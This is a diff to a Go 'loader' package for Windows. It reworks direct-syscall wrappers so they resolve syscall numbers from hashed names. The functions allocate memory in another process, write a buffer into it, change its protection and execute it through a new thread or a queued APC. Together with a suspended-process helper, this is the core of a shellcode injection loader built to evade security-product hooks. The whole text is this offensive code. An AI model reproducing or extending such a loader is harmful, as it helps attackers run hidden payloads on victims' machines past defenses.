@@ -1,9 +1,7 @@
-//go:build windows
-// +build windows
-
 package loader
 
 import (
+	"errors"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -39,13 +37,17 @@ func createSuspendedProcess() (*windows.ProcessInformation, error) {
 	return &pi, nil
 }
 
-func (pl *Loader) NtAllocateVirtualMemory(
+func (l *loader) NtAllocateVirtualMemory(
 	hProc, baseAddr uintptr,
 	memSize int,
 	allocType, protectAttr uintptr,
 ) (uintptr, error) {
+	ssn := l.resolver.GetSyscallSSN(-8110667262648832052)
+	if ssn == -1 {
+		return nullptr, errors.New("could not resolve -8110667262648832052")
+	}
 	if _, err := Syscall(
-		uint16(pl.ntdllApi[int64(-8110667262648832052)].SyscallID),
+		uint16(ssn),
 		hProc,
 		uintptr(unsafe.Pointer(&baseAddr)),
 		uintptr(unsafe.Pointer(nil)),
@@ -59,13 +61,17 @@ func (pl *Loader) NtAllocateVirtualMemory(
 	return baseAddr, nil
 }
 
-func (pl *Loader) NtWriteVirtualMemory(
+func (l *loader) NtWriteVirtualMemory(
 	hProc, baseAddr uintptr,
 	buf []byte,
 	numBytesToWrite int,
 ) (uintptr, error) {
+	ssn := l.resolver.GetSyscallSSN(-8604883203860988910)
+	if ssn == -1 {
+		return nullptr, errors.New("could not resolve -8604883203860988910")
+	}
 	if _, err := Syscall(
-		uint16(pl.ntdllApi[int64(-8604883203860988910)].SyscallID),
+		uint16(ssn),
 		hProc,
 		uintptr(unsafe.Pointer(baseAddr)),
 		uintptr(unsafe.Pointer(&buf[0])),
@@ -78,14 +84,18 @@ func (pl *Loader) NtWriteVirtualMemory(
 	return nullptr, nil
 }
 
-func (pl *Loader) NtProtectVirtualMemory(
+func (l *loader) NtProtectVirtualMemory(
 	hProc, baseAddr uintptr,
 	memSize int,
 	newProtect uintptr,
 	oldProtect uintptr,
 ) (uintptr, error) {
+	ssn := l.resolver.GetSyscallSSN(8609481851873969992)
+	if ssn == -1 {
+		return nullptr, errors.New("could not resolve 8609481851873969992")
+	}
 	if _, err := Syscall(
-		uint16(pl.ntdllApi[int64(8609481851873969992)].SyscallID),
+		uint16(ssn),
 		hProc,
 		uintptr(unsafe.Pointer(&baseAddr)),
 		uintptr(unsafe.Pointer(&memSize)),
@@ -98,9 +108,13 @@ func (pl *Loader) NtProtectVirtualMemory(
 	return oldProtect, nil
 }
 
-func (pl *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
+func (l *loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
+	ssn := l.resolver.GetSyscallSSN(-8677770082300808784)
+	if ssn == -1 {
+		return nullptr, errors.New("could not resolve -8677770082300808784")
+	}
 	if _, err := Syscall(
-		uint16(pl.ntdllApi[-8677770082300808784].SyscallID),
+		uint16(ssn),
 		uintptr(unsafe.Pointer(&hThread)), // ThreadHandle
 		windows.GENERIC_EXECUTE,           // DesiredAccess
 		0,                                 // ObjectAttributes
@@ -119,9 +133,13 @@ func (pl *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, e
 	return hThread, nil
 }
 
-func (pl *Loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
+func (l *loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
+	ssn := l.resolver.GetSyscallSSN(-7842467120007854408)
+	if ssn == -1 {
+		return nullptr, errors.New("could not resolve -7842467120007854408")
+	}
 	if _, err := Syscall(
-		uint16(pl.ntdllApi[-7842467120007854408].SyscallID),
+		uint16(ssn),
 		hThread,    // ThreadHandle
 		baseAddr,   // ApcRoutine
 		uintptr(0), // ApcRoutineContext (optional)
@@ -133,15 +151,3 @@ func (pl *Loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
 
 	return nullptr, nil
 }
-
-// NOT WORKING: gets called but then creashes because of invalid PC
-// func (pl *Loader) NtAlertResumeThread(hThread uintptr) (uintptr, error) {
-// 	if _, err := Syscall(
-// 		uint16(pl.ntdllApi[5863495249448612240].SyscallID),
-// 		hThread,
-// 		uintptr(0),
-// 	); err != nil {
-// 		return nullptr, err
-// 	}
-// 	return nullptr, nil
-// }
